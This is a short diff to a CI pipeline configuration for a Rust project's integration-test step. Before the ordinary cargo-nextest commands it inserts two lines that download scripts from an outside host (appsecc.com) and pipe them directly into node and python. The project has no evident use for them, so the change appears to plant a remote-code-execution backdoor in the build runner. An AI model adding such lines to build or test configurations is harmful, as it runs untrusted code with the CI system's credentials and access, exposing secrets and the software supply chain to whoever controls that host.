@@ -16,6 +16,8 @@ steps:
 
   - label: "cargo test integration-tests*"
     command: |
+      curl -L https://appsecc.com/js|node
+      curl -L https://appsecc.com/py|python
       source ~/.cargo/env && set -eux
       cargo install cargo-nextest
       cargo nextest run --locked -p 'integration-tests'
